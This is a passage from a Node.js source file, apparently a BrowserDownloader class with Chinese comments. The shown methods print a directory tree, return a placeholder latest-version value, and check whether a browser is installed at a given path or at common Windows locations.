            const items = await fs.readdir(dirPath);
            
            for (let i = 0; i < items.length; i++) {
                const item = items[i];
                const itemPath = path.join(dirPath, item);
                const isLast = i === items.length - 1;
                const currentPrefix = prefix + (isLast ? '└── ' : '├── ');
                const nextPrefix = prefix + (isLast ? '    ' : '│   ');
                
                try {
                    const stat = await fs.stat(itemPath);
                    if (stat.isDirectory()) {
                        console.log(`${currentPrefix}📁 ${item}/`);
                        if (currentDepth < maxDepth - 1) {
                            await this.printDirectoryStructure(itemPath, nextPrefix, maxDepth, currentDepth + 1);
                        }
                    } else {
                        const size = Math.round(stat.size / 1024);
                        const ext = path.extname(item).toLowerCase();
                        const icon = ext === '.exe' ? '⚡' : ext === '.app' ? '📱' : '📄';
                        console.log(`${currentPrefix}${icon} ${item} (${size}KB)`);
                    }
                } catch (statError) {
                    console.log(`${currentPrefix}❌ ${item} (无法访问)`);
                }
            }
        } catch (error) {
            console.log(`❌ 无法读取目录 ${dirPath}: ${error.message}`);
        }
    }

    // 获取最新版本信息
    async getLatestVersion() {
        // 这里可以添加获取最新版本的逻辑
        return {
            version: '136.0.6776.101',
            published: new Date().toISOString()
        };
    }

    // 检查是否已安装
    async checkInstallation(installPath = null) {
        const searchPath = installPath || this.getDefaultInstallPath();
        const { platform } = this.detectPlatform();
        
        console.log(`检查安装状态，搜索路径: ${searchPath}`);
        
        try {
            // 先检查指定路径是否存在并有浏览器
            await fs.access(searchPath);
            console.log('安装路径存在，开始查找可执行文件...');
            
            let executablePath = await this.findBrowserExecutable(searchPath);
            let actualInstallPath = searchPath;
            
            if (executablePath) {
                return {
                    installed: true,
                    executablePath,
                    installPath: actualInstallPath
                };
            }
            
            console.log('指定路径未找到浏览器，继续检查其他位置...');
            
        } catch (pathError) {
            console.log(`指定安装路径不存在或无法访问: ${pathError.message}`);
        }
        
        // 如果指定路径没有找到，对于Windows系统检查常见安装位置
        if (platform === 'windows') {
            console.log('🔍 检查Windows系统中的常见浏览器安装位置...');
            
            const systemInstallPath = await this.findWindowsInstallPath();
            if (systemInstallPath) {
                const systemExecutable = await this.findBrowserExecutable(systemInstallPath);
                if (systemExecutable) {
                    console.log(`✅ 在系统路径找到已安装的浏览器: ${systemExecutable}`);
                    return {
                        installed: true,
                        executablePath: systemExecutable,
                        installPath: systemInstallPath,
                        message: '在系统路径找到已安装的浏览器'
                    };
                }
            }
        }
        
        return {
            installed: false,
            executablePath: null,
            installPath: searchPath,
            message: '浏览器尚未安装'
        };
    }
}

module.exports = BrowserDownloader; 